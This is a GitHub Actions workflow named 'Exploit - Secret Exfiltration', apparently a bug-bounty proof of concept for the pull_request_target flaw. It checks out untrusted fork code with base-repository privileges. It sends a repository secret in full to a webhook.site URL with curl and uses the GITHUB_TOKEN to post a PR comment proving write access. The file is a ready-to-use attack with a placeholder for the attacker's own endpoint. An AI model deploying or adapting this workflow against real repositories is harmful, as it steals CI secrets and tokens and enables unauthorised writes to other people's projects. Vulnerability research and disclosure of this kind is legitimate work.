name: Exploit - Secret Exfiltration
on: 
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code (malicious)
        uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      - name: Display Context Info
        run: |
          echo "================================"
          echo "PROOF OF BASE REPOSITORY CONTEXT"
          echo "================================"
          echo "Repository: ${{ github.repository }}"
          echo "Event: ${{ github.event_name }}"
          echo "Actor: ${{ github.actor }}"
          echo "PR Number: ${{ github.event.pull_request.number }}"
          echo "================================"
      
      - name: Exfiltrate TEST_HACKERONE Secret
        env:
          HACKERONE_SECRET: ${{ secrets.TEST_HACKERONE }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Replace with YOUR webhook.site URL
          WEBHOOK="https://webhook.site/YOUR-UNIQUE-ID-HERE"
          
          echo "Attempting to access TEST_HACKERONE secret..."
          
          # Check if secret exists
          if [ -z "$HACKERONE_SECRET" ]; then
            echo "‚ùå TEST_HACKERONE is EMPTY - running in fork context"
            echo "Repository context: ${{ github.repository }}"
          else
            echo "‚úÖ TEST_HACKERONE SECRET ACCESSED!"
            echo "Secret length: ${#HACKERONE_SECRET} characters"
            echo "First 5 chars: ${HACKERONE_SECRET:0:5}..."
          fi
          
          # Exfiltrate to webhook
          curl -X POST "$WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "{
              \"exploit\": \"pull_request_target_secret_theft\",
              \"repository\": \"${{ github.repository }}\",
              \"pr_number\": \"${{ github.event.pull_request.number }}\",
              \"actor\": \"${{ github.actor }}\",
              \"TEST_HACKERONE_secret\": \"$HACKERONE_SECRET\",
              \"GITHUB_TOKEN_length\": \"${#GH_TOKEN}\",
              \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%S+00:00)\"
            }"
          
          echo ""
          echo "‚úÖ Data exfiltrated to webhook!"
          
      - name: Prove Write Access with GITHUB_TOKEN
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Create a comment on the PR to prove we have write access
          curl -X POST \
            -H "Authorization: token $GH_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
            -d "{\"body\":\"üö® **SECURITY VULNERABILITY PROOF** üö®\\n\\nThis comment was posted by malicious code from a forked PR running in the BASE repository context with write permissions.\\n\\n**Evidence:**\\n- Repository: \`${{ github.repository }}\`\\n- Event: \`${{ github.event_name }}\`\\n- TEST_HACKERONE secret was accessible\\n\\nPosted at: $(date -u)\"}"
          
          echo "‚úÖ Comment posted to PR as proof of write access!"
